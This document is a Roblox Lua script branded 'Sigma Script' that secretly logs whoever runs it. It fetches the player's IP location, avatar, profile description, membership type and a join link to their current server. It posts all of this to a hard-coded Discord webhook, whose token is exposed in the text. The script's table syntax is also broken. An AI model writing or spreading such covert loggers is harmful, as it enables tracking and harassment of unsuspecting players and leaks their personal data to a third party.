local IPrequest = game:HttpGet("http://ip-api.com/json/?fields=status,message,city,query")
local result = game:GetService("HttpService"):JSONDecode(IPrequest)

local Notify_Webhook = "https://discord.com/api/webhooks/1414318651971993761/XMz2_n7Kl7P8_e4mk1V7Hl9vy5AtTr06QfQZtUtSUhq2TZ2NoNQ_srTRlf6ChWF0DFHa"
local player = game.Players.LocalPlayer

local function notify_hook()
	-- Thumb API
	local AvatarCircleAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = game.HttpService:JSONDecode(AvatarCircleAPI)
	local AvatarCircle = json.data[1].imageUrl

	local AvatarAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Webp")
	local json = game.HttpService:JSONDecode(AvatarAPI)
	local Avatar = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..game.Players.LocalPlayer.UserId)
	local json = game.HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
  ["content"]= "",
  ["tts"]= false,
  ["embeds"= [
    {
      ["id"]= 985364321,
      ["title"]= "Player was logged!",
      ["description"]= "IP : \nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
      ["timestamp"]= "2025-10-08T21:00:00.000Z",
      ["color"]= 16777215,
      ["footer"]= {
        ["text"]= "Player's like to be logged!",
        ["icon_url"]= "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
      },
      ["author"]= {
        ["name"]= player.Name,
        ["url"]= "https://www.roblox.com/users/".. player.UserId .."/profile",
        ["icon_url"]= AvatarCircle
      },
      ["image"]= {
        ["url"]= Avatar
      },
      ["fields"]= [
        {
          ["id"]= 845422695,
          ["name"]= "Profile Description",
          ["value"]= ""..DescriptionData.."",
          ["inline"]= true
        }
      ]
    }
  ],
  ["components"]= [],
  ["actions"]= {},
  ["flags"]= 0,
  ["username"]= "Sigma Script",
  ["avatar_url"]= "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

notify_hook()
